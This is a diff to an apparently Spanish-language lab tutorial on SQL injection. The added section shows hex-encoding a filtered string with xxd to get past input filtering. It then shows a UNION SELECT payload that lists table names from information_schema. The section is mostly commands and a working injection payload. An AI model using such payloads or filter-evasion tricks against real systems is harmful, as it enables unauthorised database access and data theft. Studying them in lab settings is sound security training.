@@ -150,6 +150,27 @@ Resultado:
 
 ![Captura](./Imágenes/web_4.png)
 
+### Cadena hexadecimal
+
+En ocasiones, por seguridad de la página, puede ser que no podamos introducir ciertas cadenas como `'academy_labs`. Para estos casos podemos introducir la cadena en hexadecimal de la siguiente forma
+
+```bash
+ echo -n "academy_labs" | xxd -p
+```
+
+Resultado:
+
+```bash
+61636164656d795f6c616273
+```
+
+La query quedaría así
+
+```bash
+' UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema=61636164656d795f6c616273-- -
+```
+
+
 ## Listar columnas de una tabla
 
 ```sql
